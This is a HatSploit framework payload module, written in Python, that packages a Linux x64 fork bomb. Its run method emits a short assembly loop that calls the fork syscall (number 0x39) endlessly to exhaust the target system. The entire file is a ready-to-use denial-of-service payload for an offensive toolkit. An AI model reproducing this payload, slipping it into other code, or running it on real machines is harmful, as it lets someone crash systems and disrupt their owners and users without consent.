"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *
from hatsploit.lib.core.payload.linux import Linux


class HatSploitPayload(Payload, Linux):
    def __init__(self):
        super().__init__({
            'Name': "Linux x64 Fork Bomb",
            'Payload': "linux/x64/fork_bomb",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': """
                This payload is intended to cause infinite fork() on Linux
                with x64 architecture.
            """,
            'Arch': ARCH_X64,
            'Platform': OS_LINUX,
            'Type': ONE_SIDE,
        })

    def run(self):
        return self.__asm__(
            """
            start:
                push 0x39
                pop rax
                syscall
                jmp start
            """,
        )
